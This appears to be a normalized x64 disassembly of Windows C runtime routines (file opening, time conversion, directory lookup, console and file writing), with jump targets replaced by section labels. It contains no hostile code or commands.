call [ FileTimeToLocalFileTime@IAT ]
cmp eax ebx
je r-xdata
cmp [ rsp + 0x60 ] ebx
jne r-xdata
or ebx 0xffffffff
jmp r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0xe0 ]
call [ FileTimeToSystemTime@IAT ]
cmp eax ebx
je r-xdata
mov rax [ rdi + 0x20 ]
mov [ rdi + 0x18 ] rax
jmp r-xdata
movzx eax [ rsp + 0x4c ]
movzx r10d [ rsp + 0x4a ]
movzx r9d [ rsp + 0x48 ]
movzx r8d [ rsp + 0x46 ]
movzx edx [ rsp + 0x42 ]
movzx ecx [ rsp + 0x40 ]
or [ rsp + 0x30 ] 0xffffffff
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r10d
call sub_18000ab88
mov [ rdi + 0x18 ] rax
cmp [ rsp + 0x54 ] ebx
jne r-xdata
lea rdx [ rsp + 0xe0 ]
lea rcx [ rsp + 0x54 ]
call [ FileTimeToLocalFileTime@IAT ]
cmp eax ebx
je r-xdata
cmp [ rsp + 0x58 ] ebx
jne r-xdata
or ebx 0xffffffff
jmp r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0xe0 ]
call [ FileTimeToSystemTime@IAT ]
cmp eax ebx
je r-xdata
mov rax [ rdi + 0x20 ]
mov [ rdi + 0x28 ] rax
jmp r-xdata
movzx eax [ rsp + 0x4c ]
movzx r10d [ rsp + 0x4a ]
movzx r9d [ rsp + 0x48 ]
movzx r8d [ rsp + 0x46 ]
movzx edx [ rsp + 0x42 ]
movzx ecx [ rsp + 0x40 ]
or [ rsp + 0x30 ] 0xffffffff
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r10d
call sub_18000ab88
mov [ rdi + 0x28 ] rax
mov eax [ rsp + 0x74 ]
mov [ rdi + 0x14 ] eax
movzx eax [ rdi + 0x6 ]
bts eax 0xf
mov [ rdi + 0x6 ] ax
mov [ rdi ] ebx
mov [ rdi + 0x10 ] ebx
jmp r-xdata
sub_18000a21c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
xor edi edi
mov r12b 0x80
mov esi r9d
mov rbx rdx
mov [ rax - 0x58 ] 0x18
lea ebp [ rdi + 0x1 ]
mov [ rax - 0x64 ] edi
mov [ rsp + 0xd8 ] dil
mov [ rax - 0x50 ] rdi
test r12b r9b
je r-xdata
mov [ rsp + 0x70 ] ebp
mov r14b dil
mov [ rax - 0x48 ] edi
mov r14b 0x10
jmp r-xdata
bt esi 0xf
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
call sub_180008408
lea rcx [ rsp + 0x54 ]
call sub_180010718
cmp eax edi
je r-xdata
mov ecx esi
mov r8d 0x3
mov eax 0xc0000000
and ecx r8d
mov edx 0x80000000
cmp ecx edi
je r-xdata
test esi 0x74000
jne r-xdata
mov r15d edx
sub ecx ebp
je r-xdata
or r14b r12b
cmp [ rsp + 0x54 ] 0x8000
je r-xdata
mov ecx edi
sub ecx 0x10
je r-xdata
test sil 0x8
je r-xdata
cmp ecx ebp
je r-xdata
mov ebp r8d
cmp eax 0x100
je r-xdata
mov ecx ebp
jmp r-xdata
sub ecx 0x10
je r-xdata
mov r15d 0x40000000
jmp r-xdata
test esi 0x70000
jne r-xdata
mov r15d eax
jmp r-xdata
call sub_1800075c8
mov [ rax ] edi
or [ rbx ] 0xffffffff
call sub_1800075a8
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
mov [ rax ] ebx
call sub_180008530
mov eax ebx
jmp r-xdata
test sil 0x40
je r-xdata
mov al [ rw-data ]
not al
and al [ rsp + 0xe8 ]
test al 0x80
lea eax [ r13 - 0x7f ]
cmove r13d eax
mov [ rsp + 0x4c ] r13d
mov ebp 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
mov eax esi
mov edx 0x700
mov [ rsp + 0x44 ] ecx
and eax edx
je r-xdata
mov ecx r12d
jmp r-xdata
sub ecx 0x10
je r-xdata
mov ecx [ rsp + 0xe0 ]
mov r12d 0x2
sub ecx 0x10
je r-xdata
mov rbx [ rsp + 0xc8 ]
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
bt esi 0xc
jae r-xdata
bts r13d 0x1a
bts r15d 0x10
or ecx 0x4
mov [ rsp + 0x4c ] r13d
mov [ rsp + 0x44 ] ecx
bt esi 0x8
mov r13d 0x80
mov [ rsp + 0x4c ] r13d
jae r-xdata
mov ebp 0x5
jmp r-xdata
cmp eax 0x300
je r-xdata
mov ecx r8d
jmp r-xdata
cmp ecx 0x40
jne r-xdata
test sil 0x20
je r-xdata
bts r13d 0x8
mov [ rsp + 0x4c ] r13d
mov ebp r12d
jmp r-xdata
cmp eax 0x400
je r-xdata
cmp r15d edx
mov ecx edi
sete cl
jmp r-xdata
test sil 0x10
je r-xdata
bts r13d 0x1b
jmp r-xdata
cmp eax 0x500
je r-xdata
call sub_18000ffa0
mov [ rbx ] eax
cmp eax 0xffffffff
jne r-xdata
bts r13d 0x1c
mov [ rsp + 0x4c ] r13d
cmp eax 0x600
je r-xdata
mov rax [ rsp + 0xc0 ]
mov r8d [ rsp + 0x44 ]
mov rcx [ rsp + 0xd0 ]
mov [ rsp + 0x30 ] rdi
lea r9 [ rsp + 0x60 ]
mov edx r15d
mov [ rsp + 0x28 ] r13d
mov [ rax ] 0x1
mov [ rsp + 0x20 ] ebp
call [ CreateFileW@IAT ]
mov [ rsp + 0x58 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
call sub_1800075c8
mov [ rax ] edi
or [ rbx ] 0xffffffff
call sub_1800075a8
mov [ rax ] 0x18
call sub_1800075a8
mov eax [ rax ]
jmp r-xdata
cmp eax edx
je r-xdata
mov rcx rax
call [ GetFileType@IAT ]
cmp eax edi
jne r-xdata
mov ecx 0xc0000000
mov eax r15d
and eax ecx
cmp eax ecx
jne r-xdata
jmp r-xdata
cmp eax r12d
jne r-xdata
movsxd rcx [ rbx ]
lea r13 [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r13 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
call [ GetLastError@IAT ]
mov ecx eax
mov ebx eax
call sub_1800075e8
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
cmp ebx edi
jne r-xdata
movsxd rcx [ rbx ]
lea r13 [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r13 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
mov eax 0x1
test al sil
je r-xdata
cmp eax 0x3
jne r-xdata
or r14b 0x40
jmp r-xdata
call sub_1800075a8
mov edi [ rax ]
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0xd
jmp r-xdata
mov eax edi
mov r8d [ rsp + 0x44 ]
mov rcx [ rsp + 0xd0 ]
mov [ rsp + 0x30 ] rdi
btr r15d 0x1f
lea r9 [ rsp + 0x60 ]
mov [ rsp + 0x28 ] r13d
mov edx r15d
mov [ rsp + 0x20 ] ebp
call [ CreateFileW@IAT ]
mov [ rsp + 0x58 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov rdx [ rsp + 0x58 ]
mov ecx [ rbx ]
call sub_18000fcf0
movsxd rcx [ rbx ]
lea r13 [ rw-data ]
mov rax rcx
and ecx 0x1f
mov edx 0x1
sar rax 0x5
or r14b dl
mov rax [ r13 + rax * 8 ]
imul rcx rcx 0x58
mov [ rax + rcx + 0x8 ] r14b
movsxd rcx [ rbx ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r13 + rax * 8 ]
and [ rax + rcx + 0x38 ] 0x80
mov al r14b
and al 0x48
mov [ rsp + 0x48 ] al
jne r-xdata
or r14b 0x8
test r14b r14b
jns r-xdata
test r14b r14b
jns r-xdata
mov r8d 0x1
mov ecx 0x74000
test ecx esi
jne r-xdata
test r12b sil
je r-xdata
mov eax r15d
and eax 0xc0000000
cmp eax 0xc0000000
jne r-xdata
test sil 0x8
je r-xdata
mov eax esi
and eax ecx
cmp eax 0x4000
je r-xdata
mov eax [ rsp + 0x54 ]
and eax ecx
jne r-xdata
mov ecx [ rbx ]
mov r8d r12d
or edx 0xffffffff
call sub_1800105b0
mov [ rsp + 0x40 ] eax
cmp eax 0xffffffff
jne r-xdata
test r8b sil
je r-xdata
movsxd rcx [ rbx ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r13 + rax * 8 ]
or [ rax + rcx + 0x8 ] 0x20
mov [ rsp + 0xd8 ] dil
cmp eax 0x10000
je r-xdata
or esi eax
bts esi 0xe
jmp r-xdata
mov ecx [ rbx ]
lea rdx [ rsp + 0x50 ]
mov r8d 0x1
mov [ rsp + 0x50 ] di
call sub_180008b60
cmp eax edi
jne r-xdata
call sub_1800075c8
cmp [ rax ] 0x83
je r-xdata
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
mov eax [ rsp + 0x4c ]
mov r8d [ rsp + 0x44 ]
mov rcx [ rsp + 0xd0 ]
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
btr r15d 0x1f
lea r9 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] 0x3
mov edx r15d
call [ CreateFileW@IAT ]
cmp rax 0xffffffffffffffff
jne r-xdata
mov [ rsp + 0x40 ] edi
test r14b 0x40
jne r-xdata
mov ecx 0x301
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
cmp eax 0x14000
je r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_1800105b0
cmp eax 0xffffffff
je r-xdata
cmp [ rsp + 0x50 ] 0x1a
jne r-xdata
mov edx 0x1
mov ecx [ rbx ]
call sub_180009c08
jmp r-xdata
movsxd rdx [ rbx ]
mov rcx rdx
and edx 0x1f
sar rcx 0x5
imul rdx rdx 0x58
mov rcx [ r13 + rcx * 8 ]
mov [ rdx + rcx ] rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
movsxd r11 [ rbx ]
mov rax r11
and r11d 0x1f
sar rax 0x5
imul r11 r11 0x58
mov rax [ r13 + rax * 8 ]
and [ rax + r11 + 0x8 ] 0xfe
mov ecx [ rbx ]
call sub_18000fda0
jmp r-xdata
mov eax r15d
and eax 0xc0000000
cmp eax 0x40000000
je r-xdata
test esi 0x70000
je r-xdata
mov [ rsp + 0xd8 ] r12b
jmp r-xdata
cmp eax 0x20000
je r-xdata
movsxd rdx [ rsp + 0x40 ]
mov ecx [ rbx ]
call sub_180010418
cmp eax 0xffffffff
je r-xdata
cmp ebp edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp ebp r12d
jbe r-xdata
mov ecx [ rbx ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x3
call sub_180008b60
cmp eax 0xffffffff
je r-xdata
cmp eax 0xc0000000
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx ecx [ rsp + 0xd8 ]
mov r8d 0x1
mov ebp edi
sub ecx r8d
je r-xdata
cmp ebp 0x4
ja r-xdata
cmp eax r12d
je r-xdata
cmp ebp edi
jbe r-xdata
mov [ rsp + 0xd8 ] dl
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ rsp + 0x40 ] 0xbfbbef
mov r12d 0x3
cmp ecx r8d
jne r-xdata
cmp ebp 0x5
jne r-xdata
mov ecx [ rbx ]
mov r8d r12d
xor edx edx
call sub_18000f6ec
cmp rax rdi
je r-xdata
movzx eax [ rsp + 0x40 ]
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp ebp r12d
jbe r-xdata
add ebp eax
cmp r12d ebp
jg r-xdata
movsxd rcx [ rbx ]
mov bpl [ rsp + 0xd8 ]
mov rax rcx
and ecx 0x1f
and bpl 0x7f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r13 + rax * 8 ]
and [ rax + rcx + 0x38 ] 0x80
or [ rax + rcx + 0x38 ] bpl
movsxd rdx [ rbx ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rcx [ r13 + rax * 8 ]
mov eax esi
and [ rcx + rdx + 0x38 ] 0x7f
shr eax 0x10
shl al 0x7
or [ rcx + rdx + 0x38 ] al
cmp [ rsp + 0x48 ] dil
jne r-xdata
mov [ rsp + 0x40 ] 0xfeff
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_18000f6ec
cmp rax 0xffffffffffffffff
cmp eax 0xfeff
jne r-xdata
mov ecx [ rbx ]
call sub_180009c08
call sub_1800075a8
mov ebx 0x16
mov [ rax ] ebx
mov edi ebx
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_1800105b0
cmp eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x40 ] 0xbfbbef
jne r-xdata
cmp ebp 0x4
jbe r-xdata
mov ecx [ rbx ]
movsxd rax ebp
mov r8d r12d
lea rdx [ rsp + rax + 0x40 ]
sub r8d ebp
call sub_18000b7f8
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
mov edx r12d
call sub_1800105b0
cmp eax 0xffffffff
je r-xdata
jne r-xdata
lea r8d [ rax - 0x2 ]
mov [ rsp + 0xd8 ] r8b
jmp r-xdata
mov ecx [ rbx ]
mov r8d r12d
xor edx edx
call sub_18000f6ec
cmp rax rdi
je r-xdata
mov [ rsp + 0xd8 ] r12b
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_18000f6ec
cmp rax 0xffffffffffffffff
je r-xdata
sub_18000aa1c
mov [ rsp + 0x8 ] rsi
push rdi
sub rsp 0x50
mov r10d r8d
mov r8 rcx
and [ rsp + 0x40 ] 0x0
xor eax eax
mov rsi [ rsp + 0x80 ]
test rsi rsi
setne al
test eax eax
jne r-xdata
or [ rsi ] 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
call sub_1800075a8
mov edi 0x16
mov [ rax ] edi
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
mov eax edi
jmp r-xdata
mov ecx [ rsp + 0x88 ]
test ecx ecx
je r-xdata
call sub_1800075a8
mov edi 0x16
mov [ rax ] edi
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
mov eax edi
jmp r-xdata
mov rsi [ rsp + 0x60 ]
add rsp 0x50
pop rdi
retn
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] r10d
mov r9d edx
mov rdx rsi
lea rcx [ rsp + 0x40 ]
call sub_18000a21c
mov edi eax
mov [ rsp + 0x44 ] eax
cmp [ rsp + 0x40 ] 0x0
je r-xdata
test r9d 0xfffffe7f
mov eax 0x0
sete al
test eax eax
jne r-xdata
test edi edi
je r-xdata
test eax eax
je r-xdata
call sub_1800075a8
mov edi 0x16
mov [ rax ] edi
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
mov eax edi
jmp r-xdata
mov eax edi
or [ rsi ] 0xffffffff
mov ecx [ rsi ]
call sub_18000ff78
movsxd rcx [ rsi ]
mov rax rcx
sar rax 0x5
lea r8 [ rw-data ]
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r8 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
sub_18000ab54
sub rsp 0x38
mov eax r9d
mov r9d [ rsp + 0x60 ]
mov r10d r8d
mov r11 rdx
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rcx
mov r8d eax
mov edx r10d
mov rcx r11
call sub_18000aa1c
add rsp 0x38
retn
sub_18000ab88
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x60
and [ rax - 0x58 ] 0x0
and [ rax - 0x54 ] 0x0
and [ rax + 0x8 ] 0x0
lea ebx [ rcx - 0x76c ]
movsxd r14 r9d
movsxd rsi edx
cmp ebx 0x46
jl r-xdata
call sub_1800075a8
mov [ rax ] 0x16
or rax 0xffffffffffffffff
cmp ebx 0x44c
jg r-xdata
lea eax [ rsi - 0x1 ]
cmp eax 0xb
ja r-xdata
cmp r14d 0x17
ja r-xdata
movsxd r12 [ rsp + 0xb0 ]
cmp r12d 0x3b
ja r-xdata
movsxd r13 [ rsp + 0xb8 ]
cmp r13d 0x3b
ja r-xdata
cmp r8d 0x1
jl r-xdata
lea rcx [ rw-data ]
mov r10d 0x51eb851f
mov r9d [ rcx + rsi * 4 - 0x4 ]
mov ecx [ rcx + rsi * 4 ]
sub ecx r9d
cmp ecx r8d
jge r-xdata
mov eax ebx
lea ebp [ r9 + r8 ]
cdq
and edx 0x3
add eax edx
and eax 0x3
cmp eax edx
jne r-xdata
mov eax ebx
cdq
and edx 0x3
add eax edx
and eax 0x3
cmp eax edx
jne r-xdata
lea ecx [ rbx + 0x76c ]
mov eax r10d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x190
cmp ecx edx
jne r-xdata
mov eax r10d
imul ebx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x64
cmp ebx edx
jne r-xdata
lea ecx [ rbx + 0x76c ]
mov eax r10d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x190
cmp ecx edx
jne r-xdata
mov eax r10d
imul ebx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x64
cmp ebx edx
jne r-xdata
lea ecx [ rbx + 0x12b ]
mov eax r10d
lea r8d [ rbx - 0x1 ]
imul ecx
mov r9d edx
mov eax r10d
sar r9d 0x7
mov ecx r9d
shr ecx 0x1f
add r9d ecx
imul r8d
sar edx 0x5
mov eax r8d
mov ecx edx
shr ecx 0x1f
add edx ecx
sub r9d edx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ r9 + rax - 0x11 ]
movsxd rax ebx
sub rax 0x46
movsxd rdx ecx
imul rax rax 0x16d
add rdx rax
movsxd rax ebp
add rdx rax
lea rcx [ rdx + rdx * 2 ]
lea rdi [ r14 + rcx * 8 ]
imul rdi rdi 0x3c
add rdi r12
imul rdi rdi 0x3c
add rdi r13
call sub_180011154
lea rcx [ rsp + 0x30 ]
call sub_1800111c0
test eax eax
je r-xdata
cmp esi 0x2
jle r-xdata
cmp esi 0x2
jne r-xdata
lea rcx [ rsp + 0x34 ]
call sub_180011200
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
inc ebp
cmp r8d 0x1d
jg r-xdata
lea rcx [ rsp + 0x90 ]
call sub_180011240
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
movsxd rax [ rsp + 0x90 ]
mov [ rsp + 0x54 ] ebp
mov [ rsp + 0x4c ] ebx
add rdi rax
cmp [ rsp + 0xc0 ] 0x1
lea eax [ rsi - 0x1 ]
mov [ rsp + 0x40 ] r14d
mov [ rsp + 0x3c ] r12d
mov [ rsp + 0x38 ] r13d
mov [ rsp + 0x48 ] eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
movsxd rcx [ rsp + 0x34 ]
add rdi rcx
cmp [ rsp + 0xc0 ] 0xffffffff
jne r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax rdi
jmp r-xdata
cmp [ rsp + 0x30 ] 0x0
je r-xdata
lea rcx [ rsp + 0x38 ]
call sub_180011190
test eax eax
je r-xdata
sub_18000ae44
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x140
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
lea rdx [ rsp + 0x20 ]
mov ecx 0x105
lea rdi [ rsp + 0x20 ]
xor ebp ebp
call [ GetCurrentDirectoryA@IAT ]
cmp eax 0x104
mov esi eax
jle r-xdata
xor ebx ebx
test esi esi
je r-xdata
lea ebx [ rax + 0x1 ]
lea edx [ rbp + 0x1 ]
movsxd rcx ebx
call sub_180006b3c
mov rdi rax
test rax rax
jne r-xdata
call sub_1800075a8
mov [ rax ] 0xc
cmp [ rdi + 0x1 ] 0x3a
jne r-xdata
mov ebp 0x1
test esi esi
je r-xdata
call sub_1800075a8
xor esi esi
mov [ rax ] 0xc
jmp r-xdata
mov eax ebx
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_1800042d0
lea r11 [ rsp + 0x140 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx rdi
call sub_180004690
test ebp ebp
je r-xdata
movzx ecx [ rdi ]
call sub_180011414
lea ebx [ rax - 0x40 ]
jmp r-xdata
mov rdx rax
mov ecx ebx
call [ GetCurrentDirectoryA@IAT ]
mov esi eax
sub_18000af24
mov [ rsp + 0x8 ] cx
sub rsp 0x68
mov eax 0xffff
cmp cx ax
je r-xdata
add rsp 0x68
retn
lea rcx [ rsp + 0x40 ]
call sub_180005710
mov r11 [ rsp + 0x40 ]
mov edx [ r11 + 0x14 ]
test edx edx
jne r-xdata
movzx ecx [ rsp + 0x70 ]
mov r8d 0x100
cmp cx r8w
jae r-xdata
movzx edx [ rsp + 0x70 ]
lea eax [ rdx - 0x41 ]
cmp ax 0x19
ja r-xdata
mov eax [ r11 + 0x4 ]
lea r9 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x1
call sub_18001143c
test eax eax
movzx eax [ rsp + 0x70 ]
je r-xdata
lea r8 [ rsp + 0x40 ]
mov edx 0x1
call sub_18000cc88
test eax eax
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
add dx 0x20
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x80 ]
mov rax [ rsp + 0x40 ]
movzx edx [ rsp + 0x70 ]
mov rcx [ rax + 0x148 ]
movzx eax [ rcx + rdx ]
jmp r-xdata
movzx eax [ rsp + 0x70 ]
jmp r-xdata
mov ax dx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000b028
mov r9 rdx
xor eax eax
retn
cmp [ r9 ] 0x0
mov r8 r9
je r-xdata
add rcx 0x2
jmp r-xdata
movzx edx [ r9 ]
movzx eax [ rcx ]
test ax ax
je r-xdata
mov rax rcx
retn
add r8 0x2
mov dx [ r8 ]
test dx dx
jne r-xdata
cmp dx ax
je r-xdata
sub_18000b060
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_180004690
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_18000b098
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov eax 0x1b30
call sub_180015990
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1b20 ] rax
xor ebp ebp
xor edi edi
mov r13d r8d
mov r12 rdx
movsxd rbx ecx
mov [ rsp + 0x40 ] ebp
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r14 rbx
lea rax [ rw-data ]
sar r14 0x5
and r15d 0x1f
mov rcx [ rax + r14 * 8 ]
mov [ rsp + 0x50 ] r14
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_1800075c8
and [ rax ] edi
call sub_1800075a8
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
mov rcx [ rsp + 0x1b20 ]
xor rcx rsp
call sub_1800042d0
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r13d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_18000f910
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_18000f6ec
lea rax [ rw-data ]
mov rcx [ rax + r14 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r14 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r13d
mov rdx r12
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov rbp r12
test sil sil
jne r-xdata
call sub_1800068b0
xor ebx ebx
lea rdx [ rsp + 0x58 ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r13d r13d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r13d r13d
je r-xdata
test r13d r13d
je r-xdata
mov rax [ rax + r14 * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x4c ] edi
mov rbx r12
mov [ rsp + 0x58 ] eax
test r13d r13d
je r-xdata
test sil sil
je r-xdata
sub edi ebp
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_1800075a8
mov [ rax ] 0x1c
call sub_1800075c8
and [ rax ] 0x0
jmp r-xdata
cmp [ r12 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rsp + 0x720 ]
mov r8d esi
sub r8d eax
lea rax [ rw-data ]
mov [ rsp + 0x40 ] r14d
mov r14 [ rsp + 0x50 ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x720 ]
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ rbp ]
inc rbp
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
mov r14d [ rsp + 0x58 ]
mov ebp 0xd
lea rax [ rw-data ]
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rsp + 0x720 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r14d eax
test eax eax
je r-xdata
movzx eax [ rbp ]
add rbp 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rsp + 0x720 ]
mov r8d esi
sub r8d eax
lea rax [ rw-data ]
mov [ rsp + 0x40 ] r14d
mov r14 [ rsp + 0x50 ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x720 ]
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp ]
add rbp 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rsp + 0x720 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r14d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov rdx [ rsp + 0x50 ]
mov cl [ rbx ]
xor r14d r14d
cmp cl 0xa
lea rbp [ rw-data ]
mov rdx [ rbp + rdx * 8 ]
sete r14b
